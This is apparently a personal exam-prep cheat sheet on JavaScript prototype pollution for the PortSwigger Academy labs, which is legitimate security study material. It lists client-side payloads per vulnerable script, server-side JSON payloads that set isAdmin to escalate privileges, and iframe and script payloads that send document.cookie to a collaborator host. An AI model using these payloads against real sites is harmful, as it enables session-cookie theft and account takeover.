### What is it?
Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes.

Successful exploitation of prototype pollution requires the following key components:
- [A prototype pollution source](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sources) - This is any input that enables you to poison prototype objects with arbitrary properties.
- [A sink](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sinks) - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
- [An exploitable gadget](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets) - This is any property that is passed into a sink without proper filtering or sanitization.

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:
- The [URL](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-via-the-url) via either the query or fragment string (hash)
- [JSON-based input](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-via-json-input)
- Web messages

### Identify Vulnerabilities in Exam
Use DOM Invader

Example of payloads to send to the victim. Since it's meant to be a payload via URL, it should be in an iframe and URL encoded.
```
# original payload to solve the lab
https://YOUR-LAB-ID.web-security-academy.net/?__proto__[value]=data:,alert(1);

# fetch example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__proto__[value]=data:,fetch(`https%3a//OASTIFY.COM/c%3d`%2bdocument.cookie);"></iframe>

# document.location example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__proto__[value]=data:,document.location='https%3a//OASTIFY.COM/c%3d'%2bdocument.cookie"></iframe>
```

If iframe payloads won't load because of "in a frame because it set 'X-Frame-Options' to 'sameorigin'" error, use `<script>` with `location=` *not necessarily the prototype stuff this is just an example*:
```
<script>
    location="https://YOUR-LAB-ID.web-security-academy.net/?#__proto__[hitCallback]=fetch(`https%3a//OASTIFY.COM/c%3d`%2bdocument.cookie)"
</script>
```

#### Client side
Search feature

- `searchLoggerConfigurable.js`
	- `config.transport_url` 
		- **Payload: `?__proto__[value]=data:,alert(1);`**
		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.1. Lab Client-side prototype pollution via browser APIs ⭕️]]
- `searchLogger.js`
	- **Payload: `?__proto__[transport_url]=data:,alert(1)`**
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.2. Lab DOM XSS via client-side prototype pollution ⭕️]]
- `searchLoggerFiltered.js`
	- **Payload: `?__pro__proto__to__[transport_url]=data:,alert(1)`**
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.4. Lab Client-side prototype pollution via flawed sanitization ⭕️]]
- `jquery_3-0-0.js`
	- **Payload: `?__proto__.sequence=alert(1)-`**
	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [[Client side#2.3. Lab DOM XSS via an alternative prototype pollution vector ⭕️]]
- `jquery_1-7-1.js`
	- **Payload: `#__proto__[hitCallback]=alert(1)`**
	- [[Client side#2.5. Lab Client-side prototype pollution in third-party libraries ⭕️]]

#### Server side
Update Address feature

>Remember to add a comma `,` after the previous key:value pair
```
"__proto__": { "foo":"bar" }
```
##### `"foo":"bar"` reflected in response
Use this to escalate your account's privilege to admin
```
"__proto__": {
    "isAdmin":true
}
```
- [[Server side#2.6. Lab Privilege escalation via server-side prototype pollution ⭕️]]

Stage 3 - extract contents of carlos secret
- [[SSPP#Lab Exfiltrating sensitive data via server-side prototype pollution]]

##### `"foo":"bar"` *doesn't* reflect in response
- [[Server side#2.7. Lab Detecting server-side prototype pollution without polluted property reflection ⭕️]]
Enter this payload and notice the response indented then use the second one to escalate privileges to admin
```
"constructor": { "prototype": { "json spaces":10 } }

"constructor": { "prototype": { "isAdmin":true } }
```
- [[Server side#2.8. Lab Bypassing flawed input filters for server-side prototype pollution ⭕️]]
